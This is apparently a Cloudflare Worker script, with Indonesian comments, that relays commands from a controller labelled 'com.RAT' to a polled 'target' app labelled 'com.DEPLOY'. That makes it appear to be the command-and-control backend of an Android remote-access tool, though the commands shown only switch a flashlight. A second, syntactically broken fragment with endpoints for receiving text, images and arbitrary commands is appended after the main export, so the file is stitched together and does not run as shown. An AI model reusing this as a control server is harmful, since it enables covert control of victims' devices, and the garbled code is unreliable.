// Simpan command terakhir
let lastCommand = "NONE";

export default {
  async fetch(request, env) {

    // ===== CORS (aman untuk Android) =====
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type"
        }
      });
    }

    // ===== CONTROLLER (POST dari com.RAT) =====
    if (request.method === "POST") {
      try {
        const body = await request.json();
        const msg = (body.message || "").toLowerCase();

        if (
          msg.includes("nyalakan senter") ||
          msg.includes("hidupkan senter") ||
          msg.includes("flash on")
        ) {
          lastCommand = "FLASH_ON";
        } else if (
          msg.includes("matikan senter") ||
          msg.includes("flash off")
        ) {
          lastCommand = "FLASH_OFF";
        } else {
          lastCommand = "NONE";
        }

        return new Response(
          JSON.stringify({
            status: "OK",
            command: lastCommand
          }),
          {
            headers: {
              "Content-Type": "application/json",
              "Access-Control-Allow-Origin": "*"
            }
          }
        );
      } catch (e) {
        return new Response(
          JSON.stringify({ status: "ERROR" }),
          { status: 400 }
        );
      }
    }

    // ===== TARGET (GET dari com.DEPLOY) =====
    if (request.method === "GET") {
      return new Response(
        JSON.stringify({
          command: lastCommand
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*"
          }
        }
      );
    }

    return new Response("Method Not Allowed", { status: 405 });
  }
};, err);
      return new Response("Failed to save image", { status: 500 });
    }
  }

  // ======== SEND TEXT ========
  if (path === "/send") {
    const body = await request.text();
    console.log("[SEND TEXT] " + body);
    return new Response("OK", { status: 200 });
  }

  // ======== ADD COMMAND (optional) ========
  if (path === "/add_command" && request.method === "POST") {
    const data = await request.json().catch(() => ({}));
    const cmd = data.cmd;
    if (!cmd) return new Response("Missing cmd", { status: 400 });
    env.COMMANDS.push(cmd);
    return new Response(`Command added: ${cmd}`, { status: 200 });
  }

  // ======== DEFAULT ========
  return new Response("Cloudflare Worker Active", { status: 200 });
};